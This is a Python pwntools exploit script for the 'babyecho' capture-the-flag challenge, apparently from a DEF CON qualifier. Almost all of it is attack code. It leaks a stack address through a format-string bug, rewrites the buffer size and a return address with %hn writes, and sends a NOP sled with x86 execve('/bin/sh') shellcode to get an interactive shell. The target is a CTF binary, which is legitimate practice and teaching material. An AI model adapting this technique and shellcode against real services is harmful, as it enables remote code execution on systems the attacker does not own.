#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

p = remote("localhost", 1338)
# p = remote("babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me", 3232)
log.info(p.recvuntil('\n'))
log.info(p.recvuntil("\n"))

#leak buffer address
p.sendline("%5$x")
buffer_address = int(p.recvuntil("\n"), 16)
log.info("Buffer is at %s" % hex(buffer_address))
log.info(p.recvuntil("\n"))

get_address = lambda i: buffer_address+4*(i-7)

# change buffer size to 1023==0x3ff
# buffer_address is 12 bytes after 0xd on the stack
p.sendline(p32(get_address(4)+1)+"%7$hhn") # buffer_address-0xc+1 => 0xd
p.recvuntil("\n")
log.info(p.recvuntil("\n"))

addr2write = get_address(-1)
addr0 = buffer_address+32
addr1 = hex((addr0 >>16)& 0xFFFF)
addr2 = hex(addr0 & 0xFFFF)

payload = str(p32(addr2write)) + str(p32(addr2write+2)) + \
        "%" + str(int(addr1, 16)-8) + "x%8$hn" + \
        "%" + str(int(addr2.replace('0x', '0x1'),16)-int(addr1,16)) + "x%7$hn" + "\x90"*100 + shellcode

log.info("Sending payload")
p.sendline(payload)
p.interactive()
